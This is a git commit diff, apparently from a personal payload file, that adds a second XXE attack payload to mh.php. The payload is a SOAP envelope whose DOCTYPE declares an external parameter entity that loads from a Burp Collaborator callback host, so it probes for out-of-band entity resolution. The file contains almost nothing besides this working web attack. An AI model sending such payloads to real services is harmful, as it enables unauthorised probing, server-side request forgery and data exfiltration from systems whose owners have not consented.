d37665706f07a60eba523930896e4c2c27683c89
N-AH1D <hossainnahid703@gmail.com>
2026-01-26 21:55:39 +0600

    Update mh.php

--- mh.php
+++ mh.php
@@ -8,3 +8,18 @@ echo "Done"
 %remote;
 ]>
 <strXML>test</strXML>
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE test [
+<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/xxe">
+%remote;
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <Execute xmlns="http://tempuri.org/">
+      <strXML>test</strXML>
+    </Execute>
+  </soap:Body>
+</soap:Envelope>
